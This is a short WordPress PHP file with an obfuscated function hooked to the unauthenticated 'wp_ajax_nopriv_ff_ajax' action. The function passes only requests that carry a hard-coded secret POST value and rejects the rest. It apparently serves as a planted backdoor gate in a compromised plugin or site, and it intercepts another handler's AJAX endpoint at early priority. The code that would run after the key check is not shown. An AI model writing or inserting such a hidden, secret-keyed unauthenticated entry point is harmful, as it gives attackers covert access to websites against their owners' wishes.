<?php

function new_creator_pro_wpc() {
	if (!isset($_POST["vhtepxzjryul"]) || $_POST["vhtepxzjryul"] !== "i5RU96TaNgwKWZ") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'new_creator_pro_wpc', 5, 1);
